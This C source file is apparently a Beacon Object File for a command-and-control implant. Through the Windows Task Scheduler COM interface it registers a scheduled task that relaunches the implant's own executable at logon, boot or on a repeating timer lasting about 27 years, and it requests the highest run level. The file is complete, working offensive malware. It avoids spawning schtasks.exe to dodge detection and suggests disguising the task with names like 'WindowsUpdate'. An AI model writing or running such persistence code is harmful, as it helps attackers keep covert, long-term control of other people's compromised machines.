/*
 * schtask_persist_com.c - Scheduled Task persistence via COM API.
 *
 * Uses ITaskService COM interface (Task Scheduler 2.0) to create a
 * scheduled task. No cmd.exe or schtasks.exe process is spawned.
 *
 * Args (single string via Beacon Data API):
 *   "<task_name> <schedule>"
 *
 * Schedule examples:
 *   "WindowsUpdate ONLOGON"
 *   "WindowsUpdate ONSTART"
 *   "SysCheck MINUTE /MO 30"
 *   "SysCheck HOURLY /MO 2"
 *   "DailySync DAILY /MO 1"
 *   "OneShot ONCE /ST 14:30"
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c schtask_persist_com.c -o schtask_persist_com.o
 */

#include <windows.h>
#include "beacon.h"

/* ── DLL Imports ── */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(const GUID*, void*, DWORD, const GUID*, void**);

DECLSPEC_IMPORT WCHAR*  WINAPI OLEAUT32$SysAllocString(const WCHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(WCHAR*);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT void    WINAPI KERNEL32$GetLocalTime(LPSYSTEMTIME);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

/* ── Constants ── */
#define CP_ACP_VAL              0
#define CP_UTF8_VAL             65001
#define COINIT_MULTITHREADED    0x0
#define CLSCTX_INPROC_SERVER    0x1

#define TASK_TRIGGER_TIME       1
#define TASK_TRIGGER_BOOT       8
#define TASK_TRIGGER_LOGON      9
#define TASK_ACTION_EXEC        0
#define TASK_CREATE_OR_UPDATE   6
#define TASK_LOGON_INTERACTIVE_TOKEN 3
#define TASK_RUNLEVEL_HIGHEST   1

/* ── COM Vtable indices (all inherit IDispatch: 0-6 = IUnknown+IDispatch) ── */
#define VT_QI           0
#define VT_RELEASE      2

/* ITaskService: IDispatch(0-6) + GetFolder(7) GetRunningTasks(8) NewTask(9) Connect(10) ... */
#define TS_GETFOLDER    7
#define TS_CONNECT     10
#define TS_NEWTASK      9

/* ITaskFolder */
#define TF_REGISTERTD  17

/* ITaskDefinition: IDispatch(0-6) + RegistrationInfo get(7) put(8) Triggers get(9) put(10)
   Settings get(11) put(12) Data get(13) put(14) Principal get(15) put(16) Actions get(17) put(18) */
#define TD_GET_REGINFO  7
#define TD_GET_TRIGGERS 9
#define TD_GET_PRINCIPAL 15
#define TD_GET_ACTIONS  17

/* IRegistrationInfo */
#define RI_PUT_DESC     8

/* ITriggerCollection */
#define TC_CREATE      10

/* ITrigger */
#define TR_GET_REP     10
#define TR_PUT_STARTBD 15

/* IRepetitionPattern */
#define RP_PUT_INTERVAL 8
#define RP_PUT_DURATION 10

/* IActionCollection: IDispatch(0-6) + Count(7) Item(8) _NewEnum(9) XmlText get/put(10,11) Create(12) */
#define AC_CREATE      12

/* IExecAction (extends IAction: 7-9) */
#define EA_PUT_PATH    11

/* IPrincipal */
#define PR_PUT_RUNLEVEL 18

/* ── VARIANT (16 bytes, matches Windows ABI) ── */
typedef struct {
    USHORT vt;
    USHORT r1, r2, r3;
    union { LONGLONG ll; void* p; };
} MYVAR;

/* vtable accessor */
#define V(obj) (*(void***)(obj))

/* ── GUIDs ── */
static const GUID CLSID_TaskScheduler = {
    0x0f87369f, 0xa4e5, 0x4cfc,
    {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}
};
static const GUID IID_ITaskService = {
    0x2faba4c7, 0x4da9, 0x4013,
    {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}
};
static const GUID IID_IExecAction = {
    0x4c3d624d, 0xfd6b, 0x49a3,
    {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}
};

/* ── Helpers ── */
static void bof_memset(void* d, int v, unsigned long long n) {
    unsigned char* p = (unsigned char*)d;
    while (n--) *p++ = (unsigned char)v;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) {
    int n = 0; while (s[n]) n++; return n;
}
static int bof_strcmp(const char* a, const char* b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

/* Convert char to uppercase */
static char bof_upper(char c) { return (c >= 'a' && c <= 'z') ? c - 32 : c; }

/* Integer to decimal in buffer, returns length */
static int bof_itoa(int val, char* buf) {
    if (val <= 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int i = 0;
    while (val > 0) { tmp[i++] = '0' + val % 10; val /= 10; }
    for (int j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    return i;
}

/* Create BSTR from char* (using given codepage) */
static WCHAR* make_bstr(const char* s, UINT cp) {
    if (!s || !*s) { WCHAR e[] = {0}; return OLEAUT32$SysAllocString(e); }
    WCHAR wb[1024];
    int wl = KERNEL32$MultiByteToWideChar(cp, 0, s, -1, wb, 1024);
    if (wl <= 0) return NULL;
    return OLEAUT32$SysAllocString(wb);
}

/* Report HRESULT error */
static void report_hr(const char* msg, HRESULT hr) {
    char buf[256];
    int p = 0, ml = bof_strlen(msg);
    bof_memcpy(buf, msg, ml); p += ml;
    buf[p++] = ' '; buf[p++] = '0'; buf[p++] = 'x';
    for (int i = 7; i >= 0; i--) {
        int nib = ((unsigned long)hr >> (i * 4)) & 0xF;
        buf[p++] = nib < 10 ? '0' + nib : 'A' + nib - 10;
    }
    buf[p++] = '\n';
    BeaconOutput(CALLBACK_ERROR, buf, p);
}

/* Safe COM release */
static void com_release(void** pp) {
    if (*pp) {
        ((HRESULT(STDMETHODCALLTYPE*)(void*))(V(*pp)[VT_RELEASE]))(*pp);
        *pp = NULL;
    }
}

/* Parse /MO <number> from params string */
static int parse_mo(const char* s) {
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'M' && bof_upper(p[2]) == 'O' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            int v = 0;
            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            return v > 0 ? v : 1;
        }
    }
    return 1; /* default */
}

/* Parse /ST HH:MM from params string, writes to out */
static void parse_st(const char* s, char* out, int cap) {
    out[0] = '\0';
    for (const char* p = s; *p; p++) {
        if ((p[0] == '/' || p[0] == '-') &&
            bof_upper(p[1]) == 'S' && bof_upper(p[2]) == 'T' &&
            (p[3] == ' ' || p[3] == ':')) {
            p += 4; while (*p == ' ') p++;
            int i = 0;
            while (*p && *p != ' ' && i < cap - 1) out[i++] = *p++;
            out[i] = '\0';
            return;
        }
    }
}

/* Format date: YYYY-MM-DDTHH:MM:00 */
static int fmt_datetime(char* buf, int yr, int mo, int dy, int hr, int mn) {
    int p = 0;
    buf[p++] = '0' + yr / 1000; buf[p++] = '0' + (yr / 100) % 10;
    buf[p++] = '0' + (yr / 10) % 10; buf[p++] = '0' + yr % 10;
    buf[p++] = '-';
    buf[p++] = '0' + mo / 10; buf[p++] = '0' + mo % 10;
    buf[p++] = '-';
    buf[p++] = '0' + dy / 10; buf[p++] = '0' + dy % 10;
    buf[p++] = 'T';
    buf[p++] = '0' + hr / 10; buf[p++] = '0' + hr % 10;
    buf[p++] = ':';
    buf[p++] = '0' + mn / 10; buf[p++] = '0' + mn % 10;
    buf[p++] = ':'; buf[p++] = '0'; buf[p++] = '0';
    buf[p] = '\0';
    return p;
}

/* ═══════════════════════════════════════════════════════════ */

void go(char* args, int alen)
{
    HRESULT hr;
    int comInit = 0;

    void* pService  = NULL;
    void* pFolder   = NULL;
    void* pTask     = NULL;
    void* pRegInfo  = NULL;
    void* pTriggers = NULL;
    void* pTrigger  = NULL;
    void* pRepeat   = NULL;
    void* pActions  = NULL;
    void* pAction   = NULL;
    void* pExec     = NULL;
    void* pPrincipal= NULL;
    void* pRegTask  = NULL;

    WCHAR* bsRoot   = NULL;
    WCHAR* bsName   = NULL;
    WCHAR* bsDesc   = NULL;
    WCHAR* bsExe    = NULL;
    WCHAR* bsStart  = NULL;
    WCHAR* bsRepInt = NULL;
    WCHAR* bsRepDur = NULL;

    /* ── 1. Parse args ── */
    char* input = NULL;
    int input_len = 0;
    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    char raw[512];
    if (input_len >= (int)sizeof(raw)) input_len = sizeof(raw) - 1;
    bof_memcpy(raw, input, input_len);
    raw[input_len] = '\0';

    /* Split: task_name + schedule */
    char* sp = NULL;
    for (int i = 0; i < input_len; i++) {
        if (raw[i] == ' ') { sp = raw + i; break; }
    }
    if (!sp) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }
    *sp = '\0';
    char* task_name = raw;
    char* schedule = sp + 1;
    while (*schedule == ' ') schedule++;

    if (!*schedule) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    /* Extract schedule type (first word, uppercased) */
    char stype[16];
    int si = 0;
    while (schedule[si] && schedule[si] != ' ' && si < 15) {
        stype[si] = bof_upper(schedule[si]);
        si++;
    }
    stype[si] = '\0';
    char* params = schedule + si;
    while (*params == ' ') params++;

    /* Map to trigger type */
    int trigType = -1;
    int needRepeat = 0;
    int isOnce = 0;
    if      (bof_strcmp(stype, "ONLOGON") == 0) trigType = TASK_TRIGGER_LOGON;
    else if (bof_strcmp(stype, "ONSTART") == 0) trigType = TASK_TRIGGER_BOOT;
    else if (bof_strcmp(stype, "MINUTE")  == 0) { trigType = TASK_TRIGGER_TIME; needRepeat = 1; }
    else if (bof_strcmp(stype, "HOURLY")  == 0) { trigType = TASK_TRIGGER_TIME; needRepeat = 1; }
    else if (bof_strcmp(stype, "DAILY")   == 0) { trigType = TASK_TRIGGER_TIME; needRepeat = 1; }
    else if (bof_strcmp(stype, "ONCE")    == 0) { trigType = TASK_TRIGGER_TIME; isOnce = 1; }
    else {
        BeaconOutput(CALLBACK_ERROR,
            "Unknown schedule type. Use: ONLOGON ONSTART MINUTE HOURLY DAILY ONCE\n", 70);
        return;
    }

    /* Build repetition interval string (ISO 8601 duration) */
    char repIntBuf[32] = {0};
    if (needRepeat) {
        int mo = parse_mo(params);
        int p = 0;
        repIntBuf[p++] = 'P';
        if (bof_strcmp(stype, "DAILY") == 0) {
            p += bof_itoa(mo, repIntBuf + p);
            repIntBuf[p++] = 'D';
        } else {
            repIntBuf[p++] = 'T';
            p += bof_itoa(mo, repIntBuf + p);
            repIntBuf[p++] = (bof_strcmp(stype, "HOURLY") == 0) ? 'H' : 'M';
        }
        repIntBuf[p] = '\0';
    }

    /* Build StartBoundary datetime string */
    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);
    char dateBuf[32];

    if (isOnce) {
        char stTime[8];
        parse_st(params, stTime, sizeof(stTime));
        int hh = 0, mm = 0;
        if (stTime[0] && stTime[1] && stTime[2] == ':') {
            hh = (stTime[0] - '0') * 10 + (stTime[1] - '0');
            mm = (stTime[3] - '0') * 10 + (stTime[4] - '0');
        }
        fmt_datetime(dateBuf, st.wYear, st.wMonth, st.wDay, hh, mm);
    } else {
        fmt_datetime(dateBuf, st.wYear, st.wMonth, st.wDay,
                     st.wHour, st.wMinute);
    }

    /* ── 2. Get exe path ── */
    char exe_path[512];
    DWORD elen = KERNEL32$GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    if (elen == 0 || elen >= sizeof(exe_path)) {
        BeaconOutput(CALLBACK_ERROR, "GetModuleFileName failed\n", 24);
        return;
    }
    exe_path[elen] = '\0';

    /* Report */
    {
        char info[640];
        int ip = 0;
        const char* h1 = "[COM] Task: ";  int h1l = bof_strlen(h1);
        const char* h2 = " | Schedule: "; int h2l = bof_strlen(h2);
        const char* h3 = " | EXE: ";      int h3l = bof_strlen(h3);
        bof_memcpy(info + ip, h1, h1l); ip += h1l;
        bof_memcpy(info + ip, task_name, bof_strlen(task_name)); ip += bof_strlen(task_name);
        bof_memcpy(info + ip, h2, h2l); ip += h2l;
        bof_memcpy(info + ip, schedule, bof_strlen(schedule)); ip += bof_strlen(schedule);
        bof_memcpy(info + ip, h3, h3l); ip += h3l;
        bof_memcpy(info + ip, exe_path, elen); ip += elen;
        info[ip++] = '\n';
        BeaconOutput(CALLBACK_OUTPUT, info, ip);
    }

    /* ── 3. COM Init ── */
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr >= 0) comInit = 1;
    /* hr == 0x80010106 (RPC_E_CHANGED_MODE) is OK — COM already init'd */

    /* ── 4. CoCreateInstance → ITaskService ── */
    hr = OLE32$CoCreateInstance(&CLSID_TaskScheduler, NULL,
            CLSCTX_INPROC_SERVER, &IID_ITaskService, &pService);
    if (hr < 0 || !pService) {
        report_hr("CoCreateInstance failed:", hr);
        goto done;
    }

    /* ── 5. Connect to local Task Scheduler ── */
    {
        MYVAR ve; bof_memset(&ve, 0, sizeof(ve));
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, MYVAR, MYVAR, MYVAR, MYVAR);
        hr = ((pfn)(V(pService)[TS_CONNECT]))(pService, ve, ve, ve, ve);
        if (hr < 0) { report_hr("ITaskService::Connect failed:", hr); goto done; }
    }

    /* ── 6. GetFolder("\\") ── */
    {
        WCHAR wRoot[] = { '\\', 0 };
        bsRoot = OLEAUT32$SysAllocString(wRoot);
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, WCHAR*, void**);
        hr = ((pfn)(V(pService)[TS_GETFOLDER]))(pService, bsRoot, &pFolder);
        if (hr < 0 || !pFolder) { report_hr("GetFolder failed:", hr); goto done; }
    }

    /* ── 7. NewTask → ITaskDefinition ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, DWORD, void**);
        hr = ((pfn)(V(pService)[TS_NEWTASK]))(pService, 0, &pTask);
        if (hr < 0 || !pTask) { report_hr("NewTask failed:", hr); goto done; }
    }

    /* ── 8. Set description ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, void**);
        hr = ((pfn)(V(pTask)[TD_GET_REGINFO]))(pTask, &pRegInfo);
        if (hr >= 0 && pRegInfo) {
            bsDesc = make_bstr("LWraith Agent Persistence", CP_ACP_VAL);
            if (bsDesc) {
                typedef HRESULT (STDMETHODCALLTYPE *pfnPD)(void*, WCHAR*);
                ((pfnPD)(V(pRegInfo)[RI_PUT_DESC]))(pRegInfo, bsDesc);
            }
        }
    }

    /* ── 9. Create trigger ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, void**);
        hr = ((pfn)(V(pTask)[TD_GET_TRIGGERS]))(pTask, &pTriggers);
        if (hr < 0 || !pTriggers) { report_hr("get_Triggers failed:", hr); goto done; }

        typedef HRESULT (STDMETHODCALLTYPE *pfnCreate)(void*, int, void**);
        hr = ((pfnCreate)(V(pTriggers)[TC_CREATE]))(pTriggers, trigType, &pTrigger);
        if (hr < 0 || !pTrigger) { report_hr("Triggers::Create failed:", hr); goto done; }

        /* Set StartBoundary for time-based triggers */
        if (trigType == TASK_TRIGGER_TIME) {
            bsStart = make_bstr(dateBuf, CP_ACP_VAL);
            if (bsStart) {
                typedef HRESULT (STDMETHODCALLTYPE *pfnSB)(void*, WCHAR*);
                ((pfnSB)(V(pTrigger)[TR_PUT_STARTBD]))(pTrigger, bsStart);
            }
        }

        /* Set repetition pattern for MINUTE/HOURLY/DAILY */
        if (needRepeat && repIntBuf[0]) {
            typedef HRESULT (STDMETHODCALLTYPE *pfnGR)(void*, void**);
            hr = ((pfnGR)(V(pTrigger)[TR_GET_REP]))(pTrigger, &pRepeat);
            if (hr >= 0 && pRepeat) {
                bsRepInt = make_bstr(repIntBuf, CP_ACP_VAL);
                bsRepDur = make_bstr("P10000D", CP_ACP_VAL); /* ~27 years */
                if (bsRepInt) {
                    typedef HRESULT (STDMETHODCALLTYPE *pfnPI)(void*, WCHAR*);
                    ((pfnPI)(V(pRepeat)[RP_PUT_INTERVAL]))(pRepeat, bsRepInt);
                }
                if (bsRepDur) {
                    typedef HRESULT (STDMETHODCALLTYPE *pfnPD)(void*, WCHAR*);
                    ((pfnPD)(V(pRepeat)[RP_PUT_DURATION]))(pRepeat, bsRepDur);
                }
            }
        }
    }

    /* ── 10. Create ExecAction with exe path ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, void**);
        hr = ((pfn)(V(pTask)[TD_GET_ACTIONS]))(pTask, &pActions);
        if (hr < 0 || !pActions) { report_hr("get_Actions failed:", hr); goto done; }

        typedef HRESULT (STDMETHODCALLTYPE *pfnCreate)(void*, int, void**);
        hr = ((pfnCreate)(V(pActions)[AC_CREATE]))(pActions, TASK_ACTION_EXEC, &pAction);
        if (hr < 0 || !pAction) { report_hr("Actions::Create failed:", hr); goto done; }

        /* QueryInterface for IExecAction */
        typedef HRESULT (STDMETHODCALLTYPE *pfnQI)(void*, const GUID*, void**);
        hr = ((pfnQI)(V(pAction)[VT_QI]))(pAction, &IID_IExecAction, &pExec);
        if (hr < 0 || !pExec) { report_hr("QI IExecAction failed:", hr); goto done; }

        bsExe = make_bstr(exe_path, CP_ACP_VAL);
        if (!bsExe) { BeaconOutput(CALLBACK_ERROR, "make_bstr exe failed\n", 21); goto done; }

        typedef HRESULT (STDMETHODCALLTYPE *pfnPP)(void*, WCHAR*);
        hr = ((pfnPP)(V(pExec)[EA_PUT_PATH]))(pExec, bsExe);
        if (hr < 0) { report_hr("put_Path failed:", hr); goto done; }
    }

    /* ── 11. Set RunLevel to Highest (optional, best-effort) ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfn)(void*, void**);
        hr = ((pfn)(V(pTask)[TD_GET_PRINCIPAL]))(pTask, &pPrincipal);
        if (hr >= 0 && pPrincipal) {
            typedef HRESULT (STDMETHODCALLTYPE *pfnRL)(void*, int);
            ((pfnRL)(V(pPrincipal)[PR_PUT_RUNLEVEL]))(pPrincipal, TASK_RUNLEVEL_HIGHEST);
        }
    }

    /* ── 12. RegisterTaskDefinition ── */
    {
        bsName = make_bstr(task_name, CP_UTF8_VAL);
        if (!bsName) { BeaconOutput(CALLBACK_ERROR, "make_bstr name failed\n", 22); goto done; }

        MYVAR ve; bof_memset(&ve, 0, sizeof(ve));
        typedef HRESULT (STDMETHODCALLTYPE *pfnReg)(
            void*, WCHAR*, void*, long, MYVAR, MYVAR, int, MYVAR, void**);
        hr = ((pfnReg)(V(pFolder)[TF_REGISTERTD]))(
            pFolder, bsName, pTask,
            TASK_CREATE_OR_UPDATE, ve, ve,
            TASK_LOGON_INTERACTIVE_TOKEN, ve, &pRegTask);
        if (hr < 0) {
            report_hr("RegisterTaskDefinition failed:", hr);
            goto done;
        }
    }

    /* ── Success ── */
    {
        char ok[256];
        int op = 0;
        const char* m = "[COM] Scheduled task created: ";
        int ml = bof_strlen(m);
        bof_memcpy(ok + op, m, ml); op += ml;
        bof_memcpy(ok + op, task_name, bof_strlen(task_name));
        op += bof_strlen(task_name);
        ok[op++] = '\n';
        BeaconOutput(CALLBACK_OUTPUT, ok, op);
    }

done:
    /* ── 13. Cleanup COM objects ── */
    com_release(&pRegTask);
    com_release(&pPrincipal);
    com_release(&pExec);
    com_release(&pAction);
    com_release(&pActions);
    com_release(&pRepeat);
    com_release(&pTrigger);
    com_release(&pTriggers);
    com_release(&pRegInfo);
    com_release(&pTask);
    com_release(&pFolder);
    com_release(&pService);

    /* Free BSTRs */
    if (bsRoot)   OLEAUT32$SysFreeString(bsRoot);
    if (bsName)   OLEAUT32$SysFreeString(bsName);
    if (bsDesc)   OLEAUT32$SysFreeString(bsDesc);
    if (bsExe)    OLEAUT32$SysFreeString(bsExe);
    if (bsStart)  OLEAUT32$SysFreeString(bsStart);
    if (bsRepInt) OLEAUT32$SysFreeString(bsRepInt);
    if (bsRepDur) OLEAUT32$SysFreeString(bsRepDur);

    /* ── 14. CoUninitialize ── */
    if (comInit) OLE32$CoUninitialize();
}
